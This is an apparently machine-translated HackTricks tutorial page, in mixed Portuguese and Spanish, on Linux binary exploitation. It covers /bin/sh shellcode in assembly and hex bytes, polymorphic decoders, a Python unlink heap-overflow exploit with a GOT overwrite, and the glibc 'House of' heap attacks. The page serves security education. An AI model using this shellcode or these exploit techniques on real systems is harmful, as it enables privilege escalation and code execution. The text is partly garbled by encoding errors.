# Explora√ß√£o Linux (B√°sico)

<details>

<summary><strong>Aprenda hacking AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## **2.SHELLCODE**

Ver interrup√ß√µes de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento para passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel com o c√≥digo assembly e podemos extrair os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nosso shellcode e extrair os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema est√£o sendo feitas corretamente, o programa anterior deve ser compilado e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, um truque pode ser usado. A primeira instru√ß√£o √© um salto para uma chamada. A chamada chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o de chamada, inserimos a string necess√°ria, para que possamos apontar para a string com esse EIP e continuar executando o c√≥digo.

EXEMPLO **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Buscador de Ovos:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode ali armazenada (procura por alguma assinatura na shellcode). √ötil nos casos em que h√° pouco espa√ßo dispon√≠vel para injetar c√≥digo.

**Shellcodes Polim√≥rficos**

S√£o shells cifrados que possuem um pequeno c√≥digo que os descriptografa e salta para ele, usando o truque de Call-Pop, este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©todos complementares**

**T√©cnica de Murat**

Em Linux, todos os programas s√£o mapeados a partir de 0xbfffffff.

Observando como a pilha de um novo processo √© constru√≠da no Linux, √© poss√≠vel desenvolver um exploit de forma que o programa seja iniciado em um ambiente onde a √∫nica vari√°vel seja a shellcode. O endere√ßo dela pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME_do_execut√°vel_completo) - strlen(shellcode).

Dessa forma, √© poss√≠vel obter facilmente o endere√ßo onde est√° a vari√°vel de ambiente com a shellcode.

Isso √© poss√≠vel gra√ßas √† fun√ß√£o execle, que permite criar um ambiente com apenas as vari√°veis de ambiente desejadas.

### **Strings de Formato para Estouro de Buffer**

O **sprintf** move uma string formatada para uma vari√°vel. Portanto, √© poss√≠vel abusar da formata√ß√£o de uma string para causar um estouro de buffer na vari√°vel para onde o conte√∫do √© copiado. Por exemplo, a carga √∫til `%.44xAAAA` ir√° escrever 44B+"AAAA" na vari√°vel, o que pode causar um estouro de buffer.

### **Estruturas \_\_atexit**

{% hint style="danger" %}
Atualmente √© muito raro explorar isso.
{% endhint %}

O `atexit()` √© uma fun√ß√£o para a qual outras fun√ß√µes s√£o passadas como par√¢metros. Essas fun√ß√µes ser√£o executadas ao executar um `exit()` ou o retorno do `main`. Se for poss√≠vel modificar o endere√ßo de qualquer uma dessas fun√ß√µes para apontar para uma shellcode, por exemplo, voc√™ ganhar√° controle sobre o processo, mas atualmente isso √© mais complicado. Atualmente, os endere√ßos das fun√ß√µes a serem executadas est√£o ocultos por v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o criptografados com XOR e deslocamentos com uma chave aleat√≥ria. Portanto, atualmente esse vetor de ataque n√£o √© muito √∫til, pelo menos em x86 e x64_86. A fun√ß√£o de criptografia √© `PTR_MANGLE`. Outras arquiteturas como m68k, mips32, mips64, aarch64, arm, hppa... n√£o implementam a fun√ß√£o de criptografia porque retornam o mesmo que receberam como entrada. Portanto, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Atualmente √© muito raro explorar isso.
{% endhint %}

`Setjmp()` permite salvar o contexto (os registradores). `longjmp()` permite restaurar o contexto. Os registradores salvos s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`. O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o `PTR_MANGLE`, ent√£o as arquiteturas vulner√°veis a esse ataque s√£o as mesmas mencionadas anteriormente. Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes. No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, ent√£o se houver um `call ebx`, `call esi` ou `call edi` dentro da fun√ß√£o chamada, o controle pode ser assumido. Ou tamb√©m poderia modificar EBP para modificar o ESP.

### **VTable e VPTR em C++**

Cada classe tem uma Vtable que √© um array de ponteiros para m√©todos.

Cada objeto de uma classe tem um VPtr que √© um ponteiro para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se for poss√≠vel sobrescrever o VPtr, ele poderia ser modificado para apontar para um m√©todo fict√≠cio, de modo que a execu√ß√£o de uma fun√ß√£o v√° para a shellcode.

## **Medidas preventivas e evas√µes**

### **Substitui√ß√£o do Libsafe**

Ativado por: LD_PRELOAD=/lib/libsafe.so.2 ou "/lib/libsave.so.2" > /etc/ld.so.preload

Intercepta chamadas para algumas fun√ß√µes inseguras por outras seguras. N√£o √© padronizado (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD_PRELOAD n√£o funciona em bin√°rios com suid).

### **Espa√ßo de Endere√ßo ASCII Armored**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para que sempre haja um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

### **ret2plt**

Consiste em realizar um ROP de forma que a fun√ß√£o strcpy@plt (da plt) seja chamada e aponte para a entrada da GOT e copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, o mesmo √© feito apontando para GOT+1 e copiando o segundo byte de system()... Por fim, √© chamado o endere√ßo armazenado na GOT que ser√° system().

### **Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

### **Instrumenta√ß√£o de c√≥digo**

Valgrind ‚Äî> Procura por erros Memcheck RAD (Return Address Defender) Insure++
Al chamar unlink(), o P->fd usar√° os primeiros dados do 2¬∫ chunk, onde ser√° inserido o endere√ßo a ser sobrescrito - 12 (pois em FD->bk ser√° somado 12 ao endere√ßo guardado em FD). E nesse endere√ßo ser√° inserido o segundo endere√ßo encontrado no 2¬∫ chunk, que deve ser o endere√ßo da shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]
En el segundo fragmento e gra√ßas ao primeiro, sobrescrevemos o prev_size com um jump 0x0c e o size com algo para ativar -> NON_MAIN_ARENA

Em seguida, no fragmento 2, colocamos muitos nops e, finalmente, a shellcode

Dessa forma, \_int\_free(TRO√áO1, TRO√áO2) ser√° chamado e seguir√° as instru√ß√µes para escrever em \_\_DTOR_END\_\_ o endere√ßo do prev_size do TRO√áO2, que saltar√° para a shellcode.

Para aplicar essa t√©cnica, alguns requisitos adicionais precisam ser atendidos, o que complica um pouco mais o payload.

Essa t√©cnica n√£o √© mais aplic√°vel, pois foi aplicado quase o mesmo patch que para unlink. Verifica-se se o novo local apontado tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind

Interessa-nos executar o c√≥digo seguinte, que √© alcan√ßado ap√≥s a primeira verifica√ß√£o da fun√ß√£o \_int\_free()

fb = &(av->fastbins\[fastbin_index(size)] ‚Äî> Sendo fastbin_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Dessa forma, se colocarmos em "fb" o endere√ßo de uma fun√ß√£o na GOT, nesse endere√ßo ser√° colocado o endere√ßo do tro√ßo sobrescrito. Para isso, √© necess√°rio que a arena esteja pr√≥xima dos endere√ßos de dtors. Mais especificamente, av->max_fast deve estar no endere√ßo que vamos sobrescrever.

Dado que com The House of Mind vimos que control√°vamos a posi√ß√£o do av.

Ent√£o, se no campo size colocarmos um tamanho de 8 + NON_MAIN_ARENA + PREV_INUSE ‚Äî> fastbin_index() nos retornar√° fastbins\[-1\], que apontar√° para av->max_fast

Neste caso, av->max_fast ser√° o endere√ßo que ser√° sobrescrito (n√£o para onde aponta, mas essa posi√ß√£o ser√° sobrescrita).

Al√©m disso, √© necess√°rio que o tro√ßo cont√≠guo ao liberado seja maior que 8 -> Dado que dissemos que o tamanho do tro√ßo liberado √© 8, neste tro√ßo falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no tro√ßo liberado, ent√£o no in√≠cio teremos que colocar um jump que caia em nops).

Al√©m disso, esse mesmo tro√ßo falso deve ser menor que av->system_mem. av->system_mem est√° 1848 bytes adiante.

Devido aos nulos de \_DTOR_END\_ e √†s poucas dire√ß√µes na GOT, nenhum desses endere√ßos dessas se√ß√µes serve para ser sobrescrito, ent√£o vejamos como aplicar fastbin para atacar a pilha.

Outra forma de ataque √© redirecionar o **av** para a pilha.

Se modificarmos o size para ser 16 em vez de 8, ent√£o: fastbin_index() nos retornar√° fastbins\[0\] e podemos usar isso para sobrescrever a pilha.

Para isso, n√£o deve haver nenhum canary ou valores estranhos na pilha, na verdade, temos que encontrar o seguinte: 4 bytes nulos + EBP + RET

Os 4 bytes nulos s√£o necess√°rios para que o **av** esteja nesse endere√ßo e o primeiro elemento de um **av** √© o mutex que deve ser 0.

O **av->max_fast** ser√° o EBP e ser√° um valor que nos permitir√° ignorar as restri√ß√µes.

No **av->fastbins\[0\]** ser√° sobrescrito com o endere√ßo de **p** e ser√° o RET, assim a execu√ß√£o saltar√° para a shellcode.

Al√©m disso, em **av->system_mem** (1484 bytes acima da posi√ß√£o na pilha) haver√° bastante lixo que nos permitir√° ignorar a verifica√ß√£o que √© feita.

Al√©m disso, √© necess√°rio que o tro√ßo cont√≠guo ao liberado seja maior que 8 -> Dado que dissemos que o tamanho do tro√ßo liberado √© 16, neste tro√ßo falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no tro√ßo liberado, ent√£o no in√≠cio teremos que colocar um jump que caia em nops que v√™m ap√≥s o campo size do novo tro√ßo falso).

**The House of Spirit**

Neste caso, buscamos ter um ponteiro para um malloc que possa ser alterado pelo atacante (por exemplo, que o ponteiro esteja na pilha abaixo de um poss√≠vel overflow para uma vari√°vel).

Assim, poder√≠amos fazer com que esse ponteiro apontasse para onde quer que fosse. No entanto, nem todo local √© v√°lido, o tamanho do tro√ßo falso deve ser menor que av->max_fast e mais especificamente igual ao tamanho solicitado em uma futura chamada para malloc()+8. Portanto, se soubermos que ap√≥s esse ponteiro vulner√°vel √© chamado um malloc(40), o tamanho do tro√ßo falso deve ser igual a 48.

Por exemplo, se o programa perguntar ao usu√°rio por um n√∫mero, poder√≠amos inserir 48 e apontar o ponteiro de malloc modific√°vel para os pr√≥ximos 4 bytes (que poderiam pertencer ao EBP com sorte, assim o 48 fica atr√°s, como se fosse o cabe√ßalho size). Al√©m disso, o endere√ßo ptr-4+48 deve atender a v√°rias condi√ß√µes (sendo neste caso ptr=EBP), ou seja, 8 < ptr-4+48 < av->system_mem.

Caso isso seja cumprido, quando o pr√≥ximo malloc for chamado, que dissemos que era malloc(40), o endere√ßo do EBP ser√° atribu√≠do como endere√ßo. Caso o atacante tamb√©m possa controlar o que √© escrito nesse malloc, ele pode sobrescrever tanto o EBP quanto o EIP com o endere√ßo desejado.

Acredito que isso ocorre porque, quando liberado com free(), √© guardado que no endere√ßo que aponta para o EBP da pilha h√° um tro√ßo de tamanho perfeito para o novo malloc() que deseja reservar, ent√£o ele atribui esse endere√ßo.

**The House of Force**

√â necess√°rio:

* Um overflow para um tro√ßo que permita sobrescrever o wilderness
* Uma chamada para malloc() com o tamanho definido pelo usu√°rio
* Uma chamada para malloc() cujos dados possam ser definidos pelo usu√°rio

O primeiro passo √© sobrescrever o tamanho do tro√ßo wilderness com um valor muito grande (0xffffffff), para que qualquer solicita√ß√£o de mem√≥ria suficientemente grande seja tratada em \_int\_malloc() sem a necessidade de expandir o heap.

O segundo passo √© alterar o av->top para que aponte para uma √°rea de mem√≥ria sob o controle do atacante, como a pilha. Em av->top, ser√° colocado \&EIP - 8.

Devemos sobrescrever av->top para que aponte para a √°rea de mem√≥ria sob o controle do atacante:

v√≠tima = av->top;

restante = chunck_at_offset(v√≠tima, nb);

av->top = restante;

A v√≠tima obt√©m o valor do endere√ßo do tro√ßo wilderness atual (o av->top atual) e o restante √© exatamente a soma desse endere√ßo mais a quantidade de bytes solicitados por malloc(). Portanto, se \&EIP-8 estiver em 0xbffff224 e av->top contiver 0x080c2788, ent√£o a quantidade que precisamos reservar no malloc controlado para que av->top aponte para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, o valor alterado ser√° armazenado em av->top e o pr√≥ximo malloc apontar√° para o EIP e poder√° ser sobrescrito.

√â importante que o tamanho do novo tro√ßo wilderness seja maior que a solicita√ß√£o feita pelo √∫ltimo malloc(). Ou seja, se o wilderness estiver apontando para \&EIP-8, o tamanho ficar√° exatamente no campo EBP da pilha.

**The House of Lore**

**Corrup√ß√£o SmallBin**

Os tro√ßos liberados s√£o inseridos no bin com base em seu tamanho. Mas antes de serem inseridos, s√£o armazenados em unsorted bins. Quando um tro√ßo √© liberado, ele n√£o √© imediatamente colocado em seu bin, mas permanece em unsorted bins. Em seguida, se um novo tro√ßo for alocado e o anteriormente liberado puder ser √∫til, ele ser√° retornado, mas se for alocado um tro√ßo maior, o tro√ßo liberado em unsorted bins ser√° colocado em seu bin apropriado.

Para alcan√ßar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria deve ser maior que av->max_fast (normalmente 72) e menor que MIN_LARGE_SIZE (512).
Si houver um peda√ßo no bin do tamanho adequado ao que √© solicitado, ele √© devolvido ap√≥s ser desvinculado:

bck = victim->bk; Aponta para o peda√ßo anterior, √© a √∫nica informa√ß√£o que podemos alterar.

bin->bk = bck; O pen√∫ltimo peda√ßo se torna o √∫ltimo, caso bck aponte para o stack no pr√≥ximo peda√ßo reservado, ele receber√° esse endere√ßo.

bck->fd = bin; A lista √© fechada fazendo com que ele aponte para bin.

S√£o necess√°rios:

Reservar dois mallocs, de modo que o primeiro possa sofrer overflow depois que o segundo for liberado e inserido em seu bin (ou seja, um malloc maior que o segundo peda√ßo deve ser reservado antes do overflow)

O malloc reservado ao qual o atacante d√° o endere√ßo escolhido precisa ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos fazer um overflow em um heap que tem um peda√ßo liberado abaixo dele e em seu bin, podemos alterar seu ponteiro bk. Se alterarmos seu ponteiro bk e esse peda√ßo se tornar o primeiro da lista do bin e for reservado, o bin ser√° enganado e informado de que o √∫ltimo peda√ßo da lista (o pr√≥ximo a ser oferecido) est√° no endere√ßo falso que definimos (como o stack ou GOT, por exemplo). Portanto, se outro peda√ßo for reservado e o atacante tiver permiss√µes nele, ele receber√° um peda√ßo na posi√ß√£o desejada e poder√° escrever nele.

Ap√≥s liberar o peda√ßo modificado, √© necess√°rio reservar um peda√ßo maior do que o liberado, para que o peda√ßo modificado saia dos bins n√£o ordenados e seja inserido em seu bin.

Uma vez em seu bin, √© hora de modificar o ponteiro bk atrav√©s do overflow para que ele aponte para o endere√ßo que queremos sobrescrever.

Assim, o bin deve esperar at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane o bin, fazendo-o acreditar que o pr√≥ximo peda√ßo est√° no endere√ßo falso. Em seguida, o peda√ßo desejado ser√° fornecido.

Para que a vulnerabilidade seja explorada o mais r√°pido poss√≠vel, o ideal seria: reserva do peda√ßo vulner√°vel, reserva do peda√ßo a ser modificado, libera√ß√£o desse peda√ßo, reserva de um peda√ßo maior do que o a ser modificado, modifica√ß√£o do peda√ßo (vulnerabilidade), reserva de um peda√ßo do mesmo tamanho do vulnerado e reserva de um segundo peda√ßo do mesmo tamanho, que ser√° o que aponta para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o peda√ßo "n√£o" √© falso: verifica-se se bck->fd est√° apontando para a v√≠tima. Ou seja, no nosso caso, se o ponteiro fd* do peda√ßo falso apontado no stack est√° apontando para a v√≠tima. Para superar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente no stack) no endere√ßo adequado o endere√ßo da v√≠tima. Para que pare√ßa um peda√ßo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e mais alguns, al√©m disso, os peda√ßos reservados devem ser maiores que 512.

O ataque √© semelhante ao anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas para malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do peda√ßo modificado de forma que esse tamanho - nb seja < MINSIZE.

Por exemplo, √© necess√°rio definir o tamanho como 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque √© comparada com um valor n√£o assinado)

Al√©m disso, foi introduzido um patch para torn√°-lo ainda mais complicado.

**Heap Spraying**

Basicamente consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preench√™-los com um colch√£o de nops seguido de uma shellcode. Al√©m disso, o colch√£o √© preenchido com 0x0c. Assim, tenta-se saltar para o endere√ßo 0x0c0c0c0c e, se alguma dire√ß√£o for sobrescrita com esse colch√£o, o controle ser√° transferido para l√°. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se algum ponteiro √© sobrescrito e saltar para 0x0c0c0c0c, esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em cimentar a mem√≥ria por meio de reservas e libera√ß√µes, de modo que peda√ßos reservados fiquem entre peda√ßos livres. O buffer a ser transbordado ser√° colocado em um desses espa√ßos.

**objdump -d execut√°vel** ‚Äî> Desassemblar fun√ß√µes\
**objdump -d ./PROGRAMA | grep FUN√á√ÉO** ‚Äî> Obter endere√ßo da fun√ß√£o\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar se √© realmente nossa shellcode e obter os OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela de s√≠mbolos, para obter o endere√ßo de vari√°veis e fun√ß√µes\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para obter o endere√ßo de fun√ß√µes de bibliotecas (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obt√©m o endere√ßo de puts a ser sobrescrito no GOT\
**objdump -D ./exec** ‚Äî> Desassemblar TUDO at√© as entradas da plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informa√ß√µes da fun√ß√£o no gdb

## Cursos Interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao hero com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

